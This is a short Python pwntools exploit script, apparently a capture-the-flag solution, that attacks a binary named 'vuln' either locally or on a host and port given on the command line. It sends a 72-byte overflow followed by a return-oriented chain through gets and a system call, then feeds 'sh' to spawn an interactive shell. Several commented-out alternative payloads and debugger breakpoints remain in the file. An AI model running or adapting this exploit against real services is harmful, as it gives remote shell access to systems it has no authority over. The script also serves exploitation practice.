from pwn import *
import sys
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./vuln",aslr=False)
    if args.GDB:
        gdb.attach(r,'b *0x000000000040113d\nb *0x000000000040101a\nb do_system\nset follow-fork-mode parent\nb gets\nb main\nb *(main+29)')
        # gdb.attach(r,'b do_system')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
system = 0x00000000000401050
gets = 0x0000000000401060
pop_rbp_ret = 0x000000000040113d
ret = 0x000000000040101a
win = 0x000000000040117a
main = 0x0000000000401156
bss = 0x404028
r.sendline(b'A' * 72 + p64(gets) + p64(ret) + p64(0x401189))
# r.sendline(b'A' * 72 + p64(ret) + p64(system))
# r.sendline(b'A' * 72 + p64(pop_rbp_ret) + p64(0) + p64(system))
# r.sendline(b'A' * 72 + p64(main))
r.sendline(b'sh;abaa\x00')
r.interactive()